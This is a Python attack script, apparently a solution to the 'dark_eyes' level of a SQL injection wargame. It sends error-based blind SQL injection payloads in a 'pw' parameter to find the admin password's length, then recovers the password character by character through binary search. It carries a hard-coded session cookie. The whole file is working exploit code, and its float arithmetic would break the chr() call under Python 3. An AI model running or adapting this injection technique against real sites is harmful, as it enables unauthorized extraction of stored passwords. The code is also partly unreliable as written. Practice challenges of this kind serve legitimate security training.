import requests, urllib

url = "https://los.eagle-jump.org/dark_eyes_a7f01583a2ab681dc71e5fd3a40c0bd4.php"

cookie = {"PHPSESSID":"oj8l6aabt4juigeiduqcn1jl73"}

plen = 1
while True:
    param = {"pw": "0' or id='admin' and (select length(pw)=" + str(plen) + " union select 1)-- -"}
    response = requests.get(url, params=param, cookies=cookie)
    if "<hr>query : <strong>" in response.text:
        break
    else:
        print("[*] trying get password length.. now " + str(plen))
        plen += 1

print("[*] Password length is " + str(plen))

password = ""

for i in range(plen):
    now_value = 256 / 2
    for j in range(256):
        param = {"pw": "0' or id='admin' and (select ord(mid(pw," + str(i+1) + ",1))>=" + str(now_value) + " union select 1)-- -"}
        response = requests.get(url, params=param, cookies=cookie)
        if "<hr>query : <strong>" in response.text:
            param = {"pw": "0' or id='admin' and (select ord(mid(pw," + str(i+1) + ",1))=" + str(now_value) + " union select 1)-- -"}
            response = requests.get(url, params=param, cookies=cookie)
            if "<hr>query : <strong>" in response.text:
                password += chr(now_value)
                break
            now_value += 256 / 2**(j+2)
        else:
            now_value -= 256 / 2**(j+2)
        print("[*] searching " + str(i+1) + " password character.. now " + str(now_value))
    print("[*] found password " + str(i+1) +" character! now : " + password)

print("[*] password is " + password)